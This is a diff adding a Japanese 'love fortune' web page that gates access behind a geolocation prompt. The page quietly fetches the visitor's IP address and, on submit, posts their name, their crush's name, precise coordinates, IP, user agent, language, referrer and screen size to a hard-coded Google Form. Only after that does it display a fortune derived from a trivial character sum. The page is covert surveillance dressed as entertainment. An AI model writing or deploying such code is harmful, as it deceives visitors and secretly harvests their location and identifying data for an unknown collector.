@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <title>恋愛占い</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: sans-serif; background: #fff0f6; margin: 0; }
+    header { text-align: center; padding: 20px; background: #ffb3d9; }
+    h1 { margin: 0; font-size: 2rem; }
+    main { max-width: 600px; margin: 20px auto; background: #fff; padding: 20px; border-radius: 8px; }
+    label { display: block; margin-top: 12px; font-weight: bold; }
+    input { width: 100%; padding: 8px; margin-top: 4px; }
+    button { margin-top: 20px; padding: 10px 16px; background: #ff4d94; color: #fff; border: none; border-radius: 6px; cursor: pointer; }
+    button:disabled { background: #aaa; }
+    .overlay { position: fixed; inset: 0; background: rgba(255,200,220,0.95); display: flex; align-items: center; justify-content: center; z-index: 9999; }
+    .hidden { display: none; }
+    .result { margin-top: 20px; font-size: 1.2rem; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <header><h1>恋愛占い</h1></header>
+
+  <!-- 位置情報許可ゲート -->
+  <div id="gate" class="overlay">
+    <div>
+      <h2>位置情報の共有が必要です</h2>
+      <button id="geoBtn">位置情報を許可する</button>
+      <p id="geoStatus"></p>
+    </div>
+  </div>
+
+  <main>
+    <form id="loveForm">
+      <label>あなたの名前
+        <input type="text" id="yourName" required>
+      </label>
+      <label>好きな人の名前
+        <input type="text" id="crushName" required>
+      </label>
+      <button type="submit" id="submitBtn" disabled>占う</button>
+    </form>
+    <p id="status"></p>
+    <div id="fortuneResult" class="result hidden"></div>
+  </main>
+
+  <script>
+    // Googleフォーム送信先
+    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSdM5MrP4GDwETJYUuFg9UgEjYzh71xssOqKpCApmegWtGD_qg/formResponse";
+
+    // 各項目の entry ID
+    const ENTRY = {
+      yourName: "entry.1453969451",
+      crushName: "entry.2050615094",
+      lat: "entry.1858177105",
+      lon: "entry.1778813085",
+      ip: "entry.906589051",
+      ua: "entry.664800063",
+      lang: "entry.287693460",
+      ref: "entry.2022923885",
+      screen: "entry.1421079089"
+    };
+
+    let coords = null;
+    let ipAddr = null;
+
+    // IP取得
+    fetch("https://api.ipify.org?format=json")
+      .then(r => r.json())
+      .then(d => ipAddr = d.ip);
+
+    // 位置情報許可
+    document.getElementById("geoBtn").onclick = () => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        coords = pos.coords;
+        document.getElementById("gate").classList.add("hidden");
+        document.getElementById("submitBtn").disabled = false;
+      }, err => {
+        document.getElementById("geoStatus").textContent = "許可が必要です";
+      });
+    };
+
+    // 占いロジック（名前からA〜Eを決定）
+    function getFortune(yourName, crushName) {
+      const str = yourName + crushName;
+      let sum = 0;
+      for (let i = 0; i < str.length; i++) sum += str.charCodeAt(i);
+      const rank = sum % 5; // 0〜4
+      return ["A","B","C","D","E"][rank];
+    }
+
+    // フォーム送信
+    document.getElementById("loveForm").onsubmit = async e => {
+      e.preventDefault();
+      const yourName = document.getElementById("yourName").value;
+      const crushName = document.getElementById("crushName").value;
+
+      // Googleフォームに送信
+      const fd = new FormData();
+      fd.append(ENTRY.yourName, yourName);
+      fd.append(ENTRY.crushName, crushName);
+      fd.append(ENTRY.lat, coords?.latitude || "");
+      fd.append(ENTRY.lon, coords?.longitude || "");
+      fd.append(ENTRY.ip, ipAddr || "");
+      fd.append(ENTRY.ua, navigator.userAgent);
+      fd.append(ENTRY.lang, navigator.language);
+      fd.append(ENTRY.ref, document.referrer);
+      fd.append(ENTRY.screen, `${screen.width}x${screen.height}`);
+
+      await fetch(FORM_URL, { method: "POST", mode: "no-cors", body: fd });
+
+      // 占い結果を表示
+      const fortune = getFortune(yourName, crushName);
+      const resultEl = document.getElementById("fortuneResult");
+      resultEl.textContent = `あなたと ${crushName} さんの相性は… 【${fortune}】ランク！`;
+      resultEl.classList.remove("hidden");
+    };
+  </script>
+</body>
+</html>
